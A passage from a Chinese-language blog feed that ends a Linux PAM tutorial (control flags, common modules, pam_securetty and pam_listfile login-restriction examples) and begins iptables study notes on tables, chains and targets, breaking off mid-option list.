C42;&#x53E0;&#x6A21;&#x5757;&#x5373;&#x4F7F;&#x4F7F;&#x7528;requisite&#x6216;&#x8005;required&#x63A7;&#x5236;&#x6807;&#x5FD7;&#xFF0C;&#x4E5F;&#x4E0D;&#x518D;&#x6267;&#x884C;&#x3002;&#x5982;&#x679C;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;sufficent&#x7684;&#x4F5C;&#x7528;&#x548C;optional&#x76F8;&#x540C;</td></tr><tr><td>optional</td><td>&#x8868;&#x793A;&#x5373;&#x4F7F;&#x672C;&#x884C;&#x6307;&#x5B9A;&#x7684;&#x6A21;&#x5757;&#x9A8C;&#x8BC1;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x63A5;&#x53D7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x7684;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x822C;&#x8FD4;&#x56DE;PAM_IGNORE&#xFF08;&#x5FFD;&#x7565;&#xFF09;</td></tr></tbody></table><h3 id="3-&#x6A21;&#x5757;&#x8DEF;&#x5F84;"><a href="#3-&#x6A21;&#x5757;&#x8DEF;&#x5F84;" class="headerlink" title="3. &#x6A21;&#x5757;&#x8DEF;&#x5F84;"></a>3. &#x6A21;&#x5757;&#x8DEF;&#x5F84;</h3><p>&#x6A21;&#x5757;&#x8DEF;&#x5F84;.&#x5373;&#x8981;&#x8C03;&#x7528;&#x6A21;&#x5757;&#x7684;&#x4F4D;&#x7F6E;. &#x5982;&#x679C;&#x662F;64&#x4F4D;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x4FDD;&#x5B58;&#x5728;/lib64/security,&#x5982;: pam_unix.so<br>&#x540C;&#x4E00;&#x4E2A;&#x6A21;&#x5757;,&#x53EF;&#x4EE5;&#x51FA;&#x73B0;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;.&#x5B83;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7C7B;&#x578B;&#x4E2D;&#x6240;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x4E0D;&#x76F8;&#x540C;.&#x8FD9;&#x662F;&#x7531;&#x4E8E;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;<br>&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;,&#x7F16;&#x5236;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x6267;&#x884C;&#x51FD;&#x6570;.</p><h3 id="4-&#x6A21;&#x5757;&#x53C2;&#x6570;"><a href="#4-&#x6A21;&#x5757;&#x53C2;&#x6570;" class="headerlink" title="4. &#x6A21;&#x5757;&#x53C2;&#x6570;"></a>4. &#x6A21;&#x5757;&#x53C2;&#x6570;</h3><p>&#x6A21;&#x5757;&#x53C2;&#x6570;,&#x5373;&#x4F20;&#x9012;&#x7ED9;&#x6A21;&#x5757;&#x7684;&#x53C2;&#x6570;.&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;,&#x4E4B;&#x95F4;&#x7528;&#x7A7A;&#x683C;&#x5206;&#x9694;&#x5F00;,&#x5982;:<br>password   required   pam_unix.so nullok obscure min=4 max=8 md5</p><h3 id="5-&#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;"><a href="#5-&#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;" class="headerlink" title="5. &#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;"></a>5. &#x5E38;&#x7528;PAM&#x6A21;&#x5757;&#x4ECB;&#x7ECD;</h3><table><thead><tr><th>PAM&#x6A21;&#x5757;</th><th>&#x7ED3;&#x5408;&#x7BA1;&#x7406;&#x7C7B;&#x578B;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>pam_unix.so</td><td>auth</td><td>&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5E76;&#x4E0E;/ec/shadow&#x6587;&#x4EF6;&#x76F8;&#x6BD4;&#x5BF9;&#x3002;&#x5339;&#x914D;&#x8FD4;&#x56DE;0</td></tr><tr><td>-</td><td>account</td><td>&#x68C0;&#x67E5;&#x7528;&#x6237;&#x7684;&#x8D26;&#x6237;&#x4FE1;&#x606F;&#xFF08;&#x5305;&#x62EC;&#x662F;&#x5426;&#x8FC7;&#x671F;&#x7B49;&#xFF09;&#x3002;&#x8D26;&#x6237;&#x53EF;&#x7528;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;0.</td></tr><tr><td>-</td><td>password</td><td>&#x4FEE;&#x6539;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x4F5C;&#x4E3A;&#x7528;&#x6237;&#x7684;&#x65B0;&#x5BC6;&#x7801;&#x66F4;&#x65B0;shadow&#x6587;&#x4EF6;</td></tr><tr><td>pam_shells.so</td><td>auth</td><td>&#x5982;&#x679C;&#x7528;&#x6237;&#x5411;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x90A3;&#x4E48;&#x5B83;&#x7684;shell&#x5FC5;&#x987B;&#x662F;&#x5728;/etc/shells&#x6587;&#x4EF6;&#x4E2D;&#x4E4B;&#x4E00;&#x7684;shell</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>pam_deny.so</td><td>account</td><td>&#x8BE5;&#x6A21;&#x5757;&#x7528;&#x7528;&#x4E8E;&#x62D2;&#x7EDD;&#x8BBF;&#x95EE;</td></tr><tr><td>-</td><td>auth</td><td></td></tr><tr><td>-</td><td>password</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_permit.so</td><td>auth</td><td>&#x8BE5;&#x6A21;&#x5757;&#x4EFB;&#x4F55;&#x65F6;&#x5019;&#x90FD;&#x8FD4;&#x56DE;&#x6210;&#x529F;</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_securetty.so</td><td>auth</td><td>&#x5982;&#x679C;&#x7528;&#x6237;&#x8981;&#x4EE5;root&#x767B;&#x5F55;&#x65F6;&#xFF0C;&#x5219;&#x767B;&#x5F55;&#x7684;tty&#x5FC5;&#x987B;&#x5728;/etc/securetty&#x4E4B;&#x4E2D;</td></tr><tr><td>pam_listfile.so</td><td>auth</td><td>&#x8BBF;&#x95EE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x63A7;&#x5236;&#x5F00;&#x5173;</td></tr><tr><td>-</td><td>account</td><td></td></tr><tr><td>-</td><td>password</td><td></td></tr><tr><td>-</td><td>session</td><td></td></tr><tr><td>pam_cracklib.so</td><td>password</td><td>&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x53EF;&#x4EE5;&#x63D2;&#x5165;&#x5230;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#x7684;&#x5BC6;&#x7801;&#x6808;&#x4E2D;&#xFF0C;&#x7528;&#x4E8E;&#x68C0;&#x67E5;&#x5BC6;&#x7801;&#x7684;&#x5F3A;&#x5EA6;&#x3002;</td></tr><tr><td>pam_limits.so</td><td>session</td><td>&#x5B9A;&#x4E49;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4E0A;&#x9650;&#xFF0C;root&#x7528;&#x6237;&#x4E5F;&#x4F1A;&#x53D7;&#x6B64;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;/etc/security/limits.conf&#x6216;/etc/security/limits.d/*.conf&#x6765;&#x8BBE;&#x5B9A;</td></tr></tbody></table><h3 id="4-&#x5B9E;&#x4F8B;"><a href="#4-&#x5B9E;&#x4F8B;" class="headerlink" title="4. &#x5B9E;&#x4F8B;"></a>4. &#x5B9E;&#x4F8B;</h3><p>1&#x3001;pam_securetty.so</p><p>&#x9650;&#x5236;root&#x4ECE;tty1,tty2&#xFF0C;tty5&#x767B;&#x5F55;&#xFF08;&#x65E0;&#x5B9E;&#x9645;&#x610F;&#x4E49;&#xFF0C;&#x53EA;&#x662F;&#x6F14;&#x793A;pam_securetty&#x7684;&#x7528;&#x6CD5;&#xFF09;<br>&#x5728;<code>/etc/pam.d/login</code>&#x4E2D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4E00;&#x884C;</p><pre><code>auth    required    pam_securetty.so</code></pre><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145957.png" alt=""></p><p>&#x5728;/etc/securetty&#x4E2D;&#x5C06;tty1&#x3001;tty2&#x3001;tty5&#x6CE8;&#x91CA;&#x5373;&#x53EF;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145318.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p></p><p>&#x4E4B;&#x540E;&#x4F7F;&#x7528;root&#x7528;&#x6237;&#x518D;&#x6B21;&#x767B;&#x5F55;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145698.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x8FD9;&#x4E48;&#x505A;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x662F;&#x53EA;&#x9650;&#x5236;root&#x7528;&#x6237;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x5B83;&#x7528;&#x6237;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x9650;&#x5B9A;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x6B64;&#x65B9;&#x6CD5;&#x6765;&#x589E;&#x5F3A;&#x4E00;&#x4E0B;&#x5B89;&#x5168;&#x6027;&#x3002;</p><hr><p>2&#x3001;pam_listfile.so</p><p>&#x4EC5;jaking1&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;ssh&#x8FDC;&#x7A0B;&#x767B;&#x5F55;<br>&#x5728;/etc/pam.d/sshd&#x6587;&#x4EF6;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;</p><pre><code>auth    required    pam_listfile.so item=user   sense=allow file=/etc/sshdusers onerr=succeed</code></pre><p><img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072145551.png" alt=""></p><p>&#x6DFB;&#x52A0;&#x4E24;&#x4E2A;&#x7528;&#x6237;jaking1&#x548C;jaking2&#x5E76;&#x8BBE;&#x7F6E;&#x5BC6;&#x7801;</p><pre><code>useradd jaking1useradd jaking2echo jaking666 | passwd --stdin jaking1echo jaking666 | passwd --stdin jaking2</code></pre><p>&#x7F16;&#x8F91;file&#x6307;&#x5B9A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x7528;&#x6237;jaking1</p><pre><code>echo &quot;jaking1&quot; &gt; /etc/sshduserscat /etc/sshdusers</code></pre><p>&#x4F7F;&#x7528;jaking2&#x7528;&#x6237;&#x767B;&#x5F55;<br>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x63D0;&#x793A;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x5F53;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x5BC6;&#x7801;&#x540E;&#x4F1A;&#x63D0;&#x793A;<br>&#x5C31;&#x50CF;&#x8F93;&#x5165;&#x4E86;&#x9519;&#x8BEF;&#x7684;&#x5BC6;&#x7801;&#x4E00;&#x6837;&#xFF0C;&#x800C;&#x5728;&#x4F7F;&#x7528;jaking1&#x7528;&#x6237;&#x767B;&#x5F55;&#x5219;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x62D2;&#x7EDD;&#x767B;&#x5F55;&#x7684;&#x63D0;&#x793A;<br>[root@VM2 ~]# ssh <a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a><br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:jaking2@192.168.10.11" target="_blank" rel="noopener">jaking2@192.168.10.11</a>&#x2018;s password:<br>Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).<br>[root@VM2 ~]# ssh <a href="mailto:jaking1@192.168.10.11" target="_blank" rel="noopener">jaking1@192.168.10.11</a><br><a href="mailto:jaking1@192.168.10.11" target="_blank" rel="noopener">jaking1@192.168.10.11</a>&#x2018;s password:<br>Last login: Thu Aug 12 09:59:05 2021 from 192.168.10.12<br>[jaking1@VM1 ~]$<br>&#x6CE8;&#xFF1A;&#x6B64;&#x5904;&#x5982;&#x679C;root&#x4E5F;&#x4F7F;&#x7528;ssh&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x4E5F;&#x4F1A;&#x53D7;&#x5230;pam_listfile.so&#x9650;&#x5236;&#x7684;&#x3002;<br>&#x5176;&#x5B9E;pam&#x6A21;&#x5757;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x5957;&#x8DEF;&#x90FD;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x5982;&#x60F3;&#x4E86;&#x89E3;&#x66F4;&#x591A;&#x7684;PAM&#x6A21;&#x5757;&#x7684;&#x7528;&#x6CD5;&#x8BF7;man modules</p><p>[root@VM2 ~]# ssh <a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a><br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied, please try again.<br><a href="mailto:root@192.168.10.11" target="_blank" rel="noopener">root@192.168.10.11</a>&#x2018;s password:<br>Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).</p><p>&#x6E29;&#x99A8;&#x63D0;&#x793A;&#xFF1A;<br>&#x5982;&#x679C;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;Linux-PAM &#x53EF;&#x80FD;&#x4F1A;&#x6539;&#x53D8;&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;&#x8FD9;&#x53D6;&#x51B3;&#x4E8E;&#x4F60;&#x81EA;&#x5DF1;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x4E0D;&#x5B89;&#x5168;(&#x5F00;&#x653E;&#x7CFB;&#x7EDF;)&#x548C;&#x7EDD;&#x5BF9;&#x5B89;&#x5168;(&#x62D2;&#x7EDD;&#x4EFB;&#x4F55;&#x8BBF;&#x95EE;)&#x3002;&#x901A;&#x5E38;&#xFF0C;Linux-PAM &#x5728;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x65F6;&#xFF0C;&#x503E;&#x5411;&#x4E8E;&#x540E;&#x8005;&#x3002;&#x4EFB;&#x4F55;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#x90FD;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7CFB;&#x7EDF;&#x6574;&#x4E2A;&#x6216;&#x8005;&#x90E8;&#x5206;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x3002;<br>&#x914D;&#x7F6E; Linux-PAM &#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x6700;&#x5927;&#x7684;&#x95EE;&#x9898;&#x53EF;&#x80FD;&#x5C31;&#x662F; Linux-PAM &#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;/etc/pam.d/*&#x88AB;&#x5220;&#x9664;&#x4E86;&#x3002;&#x5982;&#x679C;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x4E8B;&#x60C5;&#xFF0C;&#x4F60;&#x7684;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x88AB;&#x9501;&#x4F4F;&#x3002;<br>&#x6709;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6062;&#x590D;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x7528;&#x4E00;&#x4E2A;&#x5907;&#x4EFD;&#x7684;&#x955C;&#x50CF;&#x6765;&#x6062;&#x590D;&#x7CFB;&#x7EDF;&#xFF0C;&#x6216;&#x8005;&#x767B;&#x5F55;&#x8FDB;&#x5355;&#x7528;&#x6237;&#x6A21;&#x5F0F;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x6B63;&#x786E;&#x7684;&#x914D;&#x7F6E;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x4E00;&amp;#x3001;pam&amp;#x7B80;&amp;#x4ECB;&quot;&gt;&lt;a href=&quot;#&amp;#x4E00;&amp;#x3001;pam&amp;#x7B80;&amp;#x4ECB;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x4E00;&amp;#x3001;pam&amp;#x
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iptables学习笔记</title>
    <link href="https://marnm.github.io//posts/57bbf635/"/>
    <id>https://marnm.github.io//posts/57bbf635/</id>
    <published>2022-06-07T04:53:37.000Z</published>
    <updated>2022-06-07T05:02:18.523Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h3 id="iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;"><a href="#iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;" class="headerlink" title="iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;"></a>iptables&#x7684;&#x56DB;&#x8868;&#x4E94;&#x94FE;</h3><blockquote><p>iptables&#x7684;&#x7ED3;&#x6784;&#x662F;&#x7531;talbes&#x7EC4;&#x6210;&#xFF0C;&#x800C;tables&#x662F;&#x7531;&#x94FE;&#x7EC4;&#x6210;&#xFF0C;&#x94FE;&#x53C8;&#x662F;&#x7531;&#x5177;&#x4F53;&#x7684;&#x89C4;&#x5219;&#x7EC4;&#x6210;&#x3002;<br>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5728;&#x7F16;&#x5199;iptables&#x7684;&#x89C4;&#x5219;&#x65F6;&#xFF0C;&#x8981;&#x5148;&#x6307;&#x5B9A;&#x8868;&#xFF0C;&#x518D;&#x6307;&#x5B9A;&#x94FE;&#x3002;<br>tables&#x7684;&#x4F5C;&#x7528;&#x662F;&#x533A;&#x5206;&#x4E0D;&#x540C;&#x529F;&#x80FD;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x89C4;&#x5219;&#x3002;</p></blockquote><table><thead><tr><th>&#x8868;&#x540D;</th><th>&#x529F;&#x80FD;</th><th>&#x4F18;&#x5148;&#x7EA7;&#xFF08;&#x4F4E;&#x2013;&gt;&#x9AD8;&#xFF09;</th><th>&#x5185;&#x5EFA;&#x94FE;</th></tr></thead><tbody><tr><td>filter</td><td>&#x8D1F;&#x8D23;&#x6570;&#x636E;&#x5305;&#x7684;&#x8FC7;&#x6EE4;&#x529F;&#x80FD;&#xFF0C;&#x9632;&#x706B;&#x5899;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptables_filter</td><td>4</td><td>INPUT&#x3001; OUTPUT&#x3001; FORWARD</td></tr><tr><td>nat</td><td>&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x529F;&#x80FD;&#xFF1B;&#x5185;&#x6838;&#x6A21;&#x5757;&#xFF1A;iptable_nat</td><td>3</td><td>PREROUTING &#x3001;POSTROUTING&#x3001; OUTPUT</td></tr><tr><td>mangle</td><td>&#x62C6;&#x89E3;&#x62A5;&#x6587;&#xFF0C;&#x505A;&#x51FA;&#x4FEE;&#x6539;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x7EC4;&#x88C5;&#x6210;&#x6570;&#x636E;&#x5305;&#x7684;&#x529F;&#x80FD;&#xFF0C;iptable_mangle</td><td>2</td><td>PREROUTING&#x3001; OUTPUT&#x3001; FORWARD&#x3001; INPUT&#x3001; POSTROUTING</td></tr><tr><td>raw</td><td>&#x6570;&#x636E;&#x8DDF;&#x8E2A;&#xFF0C;&#x5173;&#x95ED;nat&#x8868;&#x4E0A;&#x542F;&#x7528;&#x7684;&#x8FDE;&#x63A5;&#x8FFD;&#x8E2A;&#x673A;&#x5236;&#xFF1B;table_raw</td><td>1</td><td>PREROUTING &#x3001;OUTPUT</td></tr></tbody></table><p><em>&#x89C4;&#x5219;&#x94FE;</em></p><table><thead><tr><th>&#x94FE;&#x7C7B;&#x578B;</th><th>&#x4F5C;&#x7528;&#x57DF;</th></tr></thead><tbody><tr><td>PREROUTING</td><td>&#x6570;&#x636E;&#x5305;&#x8FDB;&#x5165;&#x8DEF;&#x7531;&#x8868;&#x4E4B;&#x524D;</td></tr><tr><td>INPUT</td><td>&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#x76EE;&#x7684;&#x5730;&#x4E3A;&#x672C;&#x673A;</td></tr><tr><td>OUTPUT</td><td>&#x7531;&#x672C;&#x673A;&#x4EA7;&#x751F;&#xFF0C;&#x5411;&#x5916;&#x8F6C;&#x53D1;</td></tr><tr><td>FORWARD</td><td>&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x540E;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x4E0D;&#x4E3A;&#x672C;&#x673A;</td></tr><tr><td>POSTROUTING</td><td>&#x53D1;&#x9001;&#x5230;&#x7F51;&#x5361;&#x63A5;&#x53E3;&#x4E4B;&#x524D;</td></tr></tbody></table><p><strong>&#x94FE;&#x8868;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x987A;&#x5E8F;&#xFF1A;</strong></p><ul><li>&#x8868;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A;raw &gt; mangle &gt; nat &gt; filter</li><li>&#x94FE;&#x95F4;&#x7684;&#x4F18;&#x5148;&#x987A;&#x5E8F;&#xFF1A;<ul><li>&#x5165;&#x7AD9;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; INPUT</li><li>&#x51FA;&#x7AD9;&#x6570;&#x636E;&#xFF1A;OUTPUT &gt; POSTROUTING</li><li>&#x8F6C;&#x53D1;&#x6570;&#x636E;&#xFF1A;PREROUTING &gt; FORWARD &gt; POSTROUTING</li></ul></li><li>&#x94FE;&#x5185;&#x7684;&#x5339;&#x914D;&#x987A;&#x5E8F;&#xFF1A;<ul><li>&#x81EA;&#x9876;&#x5411;&#x4E0B;&#x6309;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#xFF0C;&#x627E;&#x5230;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#x5373;&#x505C;&#x6B62;&#xFF08;LOG&#x9009;&#x9879;&#x8868;&#x793A;&#x8BB0;&#x5F55;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF09;</li><li>&#x82E5;&#x5728;&#x8BE5;&#x94FE;&#x5185;&#x627E;&#x4E0D;&#x5230;&#x76F8;&#x5339;&#x914D;&#x7684;&#x89C4;&#x5219;&#xFF0C;&#x5219;&#x6309;&#x8BE5;&#x94FE;&#x7684;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x5904;&#x7406;&#xFF08;&#x672A;&#x4FEE;&#x6539;&#x7684;&#x72B6;&#x51B5;&#x4E0B;&#xFF0C;&#x9ED8;&#x8BA4;&#x7B56;&#x7565;&#x4E3A;&#x5141;&#x8BB8;&#xFF09;</li></ul></li></ul><p><strong>&#x5339;&#x914D;&#x6761;&#x4EF6;</strong></p><ul><li>&#x6E90;&#x5730;&#x5740;Source IP</li><li>&#x76EE;&#x6807;&#x5730;&#x5740;Destination IP</li></ul><p><strong>&#x5904;&#x7406;&#x52A8;&#x4F5C;</strong></p><ul><li>ACCEPT&#xFF1A;&#x5141;&#x8BB8;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7;</li><li>DROP&#xFF1A;&#x76F4;&#x63A5;&#x4E22;&#x5F03;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x4E0D;&#x7ED9;&#x4EFB;&#x4F55;&#x56DE;&#x5E94;&#x4FE1;&#x606F;</li><li>REJECT&#xFF1A;&#x62D2;&#x7EDD;&#x6570;&#x636E;&#x5305;&#x901A;&#x8FC7;&#xFF0C;&#x5FC5;&#x8981;&#x65F6;&#x4F1A;&#x7ED9;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7AEF;&#x4E00;&#x4E2A;&#x54CD;&#x5E94;&#x4FE1;&#x606F;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x521A;&#x8BF7;&#x6C42;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x62D2;&#x7EDD;&#x7684;&#x4FE1;&#x606F;&#x3002;</li><li>SNAT&#xFF1A;&#x6E90;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF0C;&#x89E3;&#x51B3;&#x5185;&#x7F51;&#x7528;&#x6237;&#x7528;&#x540C;&#x4E00;&#x4E2A;&#x516C;&#x7F51;&#x5730;&#x5740;&#x4E0A;&#x7F51;&#x7684;&#x95EE;&#x9898;</li><li>MASQUERADE&#xFF1A;&#x662F;SNAT&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x5F62;&#x5F0F;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x52A8;&#x6001;&#x3001;&#x4E34;&#x65F6;&#x4F1A;&#x53D8;&#x7684;IP&#x4E0A;</li><li>DNAT&#xFF1A;&#x76EE;&#x6807;&#x5730;&#x5740;&#x8F6C;&#x6362;</li><li>REDIRECT&#xFF1A;&#x5728;&#x672C;&#x673A;&#x505A;&#x7AEF;&#x53E3;&#x6620;&#x5C04;</li><li>LOG&#xFF1A;&#x5728;<code>/var/log/messages</code>&#x6587;&#x4EF6;&#x4E2D;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5305;&#x4F20;&#x9012;&#x7ED9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x9664;&#x4E86;&#x8BB0;&#x5F55;&#x4EE5;&#x5916;&#x4E0D;&#x5BF9;&#x6570;&#x636E;&#x5305;&#x505A;&#x4EFB;&#x4F55;&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#xFF0C;&#x4ECD;&#x7136;&#x8BA9;&#x4E0B;&#x4E00;&#x6761;&#x89C4;&#x5219;&#x53BB;&#x5339;&#x914D;&#x3002;</li></ul><p><strong>&#x9009;&#x9879;</strong></p><pre><code>-t&#xFF0C;--table&#xFF1A;&#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x8868;table&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;table&#x5FC5;&#x987B;&#x662F;raw&#xFF0C;nat&#xFF0C;filter&#xFF0C;mangle&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;-t&#xFF0C;&#x9ED8;&#x8BA4;filter&#x8868;# &#x901A;&#x7528;&#x5339;&#x914D;&#xFF1A;&#x6E90;&#x5730;&#x5740;&#xFF0C;&#x76EE;&#x6807;&#x5730;&#x5740;&#x7684;&#x5339;&#x914D;-p&#xFF1A;&#x6307;&#x5B9A;&#x8981;&#x5339;&#x914D;&#x7684;&#x534F;&#x8BAE;&#x7C7B;&#x578B;-s&#xFF0C;--souce [!] address[/mask]&#xFF1A;&#x628A;&#x6307;&#x5B9A;&#x7684; &#x4E00;&#x4E2A;/&#x4E00;&#x7EC4; 